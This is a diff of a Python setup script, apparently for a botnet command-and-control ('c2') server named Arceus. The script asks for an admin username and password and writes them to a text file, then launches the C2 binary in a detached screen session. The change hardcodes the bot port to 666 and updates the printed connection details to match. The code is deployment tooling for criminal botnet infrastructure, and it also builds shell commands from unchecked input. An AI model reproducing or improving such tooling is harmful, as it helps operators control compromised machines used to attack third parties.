@@ -66,7 +66,6 @@ password = raw_input(""+ white +"Enter Desired Password:"+ red +" ")
 print(""+ white +"Setting Up User: "+ red +"["+ white +""+ username +""+ red +"] "+ white +"With "+ cyan +"Administrator "+ white +"Account!")
 Arceus("echo "+ username +" "+ password +" admin >> arceus.txt")
 IP = raw_input(""+ white +"Enter Your Servers IP:"+ red +" ")
-bport = raw_input(""+ white +"Enter your desired BotPort:"+ red +" ")
 threads = raw_input(""+ white +"Enter Desired Threads to screen on:"+ red +" ")
 cport = raw_input(""+ white +"Enter your desired Connection Port:"+ red +" ")
 #///////////////////////
@@ -156,6 +155,6 @@ elif cleanup == "n" or "N":
     print(""+ red +"Continuing!")
 
 print(""+ white +"Now we're done! lets screen and connect.")
-Arceus("screen -dm ./c2 "+ bport +" "+ threads +" "+ cport +"")
+Arceus("screen -dm ./c2 666 "+ threads +" "+ cport +"")
 print(""+ white +"Its up! Information below!")
-print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Port: "+ red +"["+ white +""+ cport +""+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
+print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Connection Port: "+ red +"["+ white +""+ cport +""+ red +"] "+ white +"BotPort: "+ red +"["+ white +"666"+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
